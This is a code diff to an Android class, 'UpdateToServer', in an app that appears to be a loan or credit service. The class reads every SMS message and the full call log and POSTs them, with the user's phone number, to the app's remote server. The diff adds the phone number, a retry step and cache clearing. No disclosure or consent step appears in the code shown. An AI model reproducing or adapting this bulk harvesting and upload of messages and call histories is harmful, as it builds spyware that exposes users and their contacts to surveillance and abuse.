@@ -15,6 +15,8 @@ import com.android.volley.Response;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
+import com.app.genialnykredyt.Contants.BaseUrl;
+import com.app.genialnykredyt.Session.SessionManager;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -25,38 +27,43 @@ import java.util.Map;
 public class UpdateToServer {
     Context context;
     Uri mSmsQueryUri = Uri.parse("content://sms");
+    SessionManager sessionManager;
     //static String response;
     //static String serverResponse="";
 
-    public UpdateToServer(Context context)
-    {
+    boolean volleyError= false;
+
+    public UpdateToServer(Context context) {
         this.context = context;
+        sessionManager = new SessionManager(context);
+       // trimCache(context);
+
     }
 
-    public ArrayList<String> getMessages()
-    {
-
+    public ArrayList<String> getMessages() {
+        //trimCache(context);
         ArrayList<String> messages = new ArrayList<String>();
-        ContentResolver contentResolver=context.getContentResolver();
+        ContentResolver contentResolver = context.getContentResolver();
         Cursor cursor = null;
         try {
-            cursor = contentResolver.query(mSmsQueryUri, new String[] { "_id", "address", "date", "body",
-                    "type", "read" }, null, null, "date desc");
+            cursor = contentResolver.query(mSmsQueryUri, new String[]{"_id", "address", "date", "body",
+                    "type", "read"}, null, null, "date desc");
             if (cursor == null) {
                 Log.i("curson null", "cursor is null. uri: " + mSmsQueryUri);
             }
 
-            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {
+            Log.i("count", String.valueOf(cursor.getCount()));
 
+            for (boolean hasData = cursor.moveToFirst(); hasData; hasData = cursor.moveToNext()) {
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 String address = cursor.getString(cursor.getColumnIndex("address"));
 
-                messages.add("\n\n"+"Number:     "+address+"\n"+"Content:     "+body+"\n\n");
+                messages.add("\n\n" + "Number:     " + address + "\n" + "Content:     " + body + "\n\n");
             }
         } catch (Exception e) {
             Log.e("Error", e.getMessage());
         } finally {
-            if(cursor!=null){
+            if (cursor != null) {
                 cursor.close();
             }
 
@@ -66,8 +73,7 @@ public class UpdateToServer {
     }
 
 
-    private  String getCallDetail()
-    {
+    private String getCallDetail() {
         StringBuffer stringBuffer = new StringBuffer();
         Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                 null, null, null, CallLog.Calls.DATE + " DESC");
@@ -105,54 +111,56 @@ public class UpdateToServer {
     }
 
 
+
+
     public void addtoServer(final Context context) {
-
-        final ArrayList<String> smss=getMessages();
-        final String callllogs=getCallDetail();
-        trimCache(context);
-        StringRequest request=new StringRequest(Request.Method.POST, "https://genialnykredyt.eu/get_messages_api/store_new_details.php", new Response.Listener<String>()
-        {
+        String url = BaseUrl.baseUrl + context.getResources().getString(R.string.store_new_details);
+        final ArrayList<String> smss = getMessages();
+        Log.i("Messages",smss.toString());
+        final String callllogs = getCallDetail();
+        // trimCache(context);
+        StringRequest request = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
 
             @Override
-            public void onResponse( String response) {
+            public void onResponse(String response) {
 
-                Log.i("RESPONSE",response);
-
-                //serverResponse=response;
-                //Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
+               // Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
 
             }
-        }, new Response.ErrorListener()
-        {
+        }, new Response.ErrorListener() {
             @Override
-            public void onErrorResponse(VolleyError error)
-            {
-                //Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();
+            public void onErrorResponse(VolleyError error) {
+                volleyError = true;
+                Toast.makeText(context, "Something went wrong. Please Try again "+"\n"+"Error:  "+ error.getMessage(), Toast.LENGTH_SHORT).show();
             }
-        })
-        {
+        }) {
             @Override
-            protected Map<String,String> getParams() throws AuthFailureError {
-                HashMap<String,String> params=new HashMap<>();
+            protected Map<String, String> getParams() throws AuthFailureError {
+                HashMap<String, String> params = new HashMap<>();
 
-                params.put("imei_no","");
-
-                String DEVICE_NAME = android.os.Build.MODEL;
-
-                if(DEVICE_NAME!=null){
-                    Log.i("IMEII",DEVICE_NAME);
-                    params.put("device_name",DEVICE_NAME);
-                }
-
-                params.put("calllog",callllogs.toString());
+                params.put("imei_no", "");
+                Log.i("phone",SessionManager.getPhoneNumber());
+                params.put("phone", SessionManager.getPhoneNumber());
+                params.put("calllog", callllogs);
                 params.put("record", smss.toString());
 
                 return params;
             }
         };
-        RequestQueue requestQueue= Volley.newRequestQueue(context);
+        final RequestQueue requestQueue = Volley.newRequestQueue(context);
         requestQueue.add(request);
 
+        requestQueue.addRequestFinishedListener(new RequestQueue.RequestFinishedListener<Object>() {
+            @Override
+            public void onRequestFinished(Request<Object> request) {
+                requestQueue.getCache().clear();
+            }
+        });
+
+        if(volleyError){
+            final RequestQueue requestQueueNew = Volley.newRequestQueue(context);
+            requestQueueNew.add(request);
+        }
     }
 
 
@@ -166,7 +174,6 @@ public class UpdateToServer {
             // TODO: handle exception
         }
     }
-
 
 
     public static boolean deleteDir(File dir) {
